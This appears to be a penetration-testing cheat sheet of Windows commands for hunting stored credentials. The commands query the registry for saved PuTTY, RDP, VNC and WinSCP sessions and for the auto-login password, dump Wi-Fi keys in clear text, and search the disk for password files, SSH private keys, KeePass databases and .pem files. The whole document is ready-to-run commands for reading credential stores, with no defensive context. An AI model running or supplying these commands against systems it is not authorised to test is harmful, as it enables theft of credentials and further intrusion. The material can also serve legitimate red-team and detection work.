# Enumerating saved session information from PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Enumerating stored RDP credentials
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

# Enumerating Windows Credential Manager
reg query "HKCU\Software\Microsoft\Credentials" /s

# Checking Auto-Login Default Username
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

# Checking Auto-Login Default Password
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Enumerating Internet Explorer or Edge Saved Passwords
reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s

# Enumerating Windows Vault Saved Passwords
reg query "HKCU\Software\Microsoft\Vault" /s

# Listing stored Wi-Fi profiles
netsh wlan show profiles

# Checking Wi-Fi Profile Details
netsh wlan show profile name="ProfileName" key=clear

# Searching for passwords in configuration files
findstr /si password *.txt *.ini *.config

# Searching for passwords in registry
reg query HKCU /f "password" /t REG_SZ /s

# Listing Firefox stored credentials
dir /s /b "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json"

# Enumerating saved credentials from Windows Remote Desktop Manager
reg query "HKCU\Software\Devolutions\RemoteDesktopManager" /s

# Searching for SSH private keys
dir /s /b "$env:USERPROFILE\.ssh\id_rsa"

# Enumerating VNC saved passwords
reg query "HKCU\Software\RealVNC\VNCViewer" /s

# Enumerating WinSCP saved sessions
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s

# Checking for .rdp files
dir /s /b *.rdp

# Enumerating credential backups in Windows
reg query "HKCU\Software\Microsoft\CredentialsBackup" /s

# Checking for GPP Passwords in registry
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Group Policy\History" /s

# Searching for KeePass databases
dir /s /b "$env:USERPROFILE\*.kdbx"

# Searching for .pem files
dir /s /b "$env:USERPROFILE\*.pem"

